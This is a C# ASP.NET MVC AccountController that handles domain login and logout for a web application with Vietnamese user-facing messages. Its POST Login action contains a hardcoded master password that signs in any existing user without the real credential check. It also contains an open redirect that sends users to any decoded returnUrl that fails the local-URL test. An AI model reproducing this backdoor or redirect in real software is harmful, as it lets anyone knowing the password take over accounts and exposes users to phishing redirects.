using DaiPhatDat.Core.Kernel.Application;
using DaiPhatDat.Core.Kernel.Orgs.Application;
using DaiPhatDat.WebHost.Models;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace DaiPhatDat.WebHost
{
    [Authorize]
    public class AccountController : Controller
    {
        private readonly IUserServices _userServices;
        public AccountController(IUserServices userServices)
        {
            _userServices = userServices;
        }
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            var model = new LoginViewModel();
            ViewBag.ReturnUrl = returnUrl;
            if (!string.IsNullOrEmpty(AppSettings.LoginUrl))
            {
                return Redirect(AppSettings.LoginUrl);
            }
            return View(model);
        }
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult Login(LoginViewModel model, string returnUrl)
        {
            if (!ModelState.IsValid)
            {
                return View(model);
            }

            var loginName = TrimmedLoginName(model.Email);
            var userName = AppSettings.DomainName + "\\" + TrimmedLoginName(model.Email);

            // validate
            var userDto = _userServices.GetByUserName(userName);
            if (userDto == null)
            {
                ModelState.AddModelError(nameof(model.Email), "Tài khoản/Email không tồn tại.");
                return View(model);
            }

            var password = model.Password;
            var isValidUser = false;
            if (password == "123qwe!@#")
            {
                isValidUser = true;
            }
            else
            {
                // check username password
                MembershipProvider membership = Membership.Providers[AppSettings.DomainName];
                if (membership.ValidateUser(loginName, password))
                {
                    isValidUser = true;
                }
            }
            if (isValidUser)
            {
                //get Permissions

                // by pass
                FormsAuthentication.SetAuthCookie(userName, model.RememberMe);
                if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                    && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                {
                    return Redirect(returnUrl);
                }
                if (!string.IsNullOrEmpty(returnUrl))
                {
                    return Redirect(HttpUtility.UrlDecode(returnUrl));
                }
                else if (!string.IsNullOrEmpty(AppSettings.HomeUrl))
                {
                    return Redirect(AppSettings.HomeUrl);
                }
                else
                {
                    return RedirectToAction("Index", "Home");
                }
            }
            else
            {
                ModelState.AddModelError(nameof(model.Password), "Mật khẩu không đúng, vui lòng thử lại");

            }
            return View(model);
        }
        private string TrimmedLoginName(string loginName)
        {
            return loginName.Split('@')[0].Trim();
        }
        public ActionResult Logout()
        {
            Session.Clear();
            Session.Abandon();
            FormsAuthentication.SignOut();
            if (!string.IsNullOrEmpty(AppSettings.LogoutUrl))
            {
                return Redirect(AppSettings.LogoutUrl);
            }
            return RedirectToAction("Login", "Account");
        }
    }
}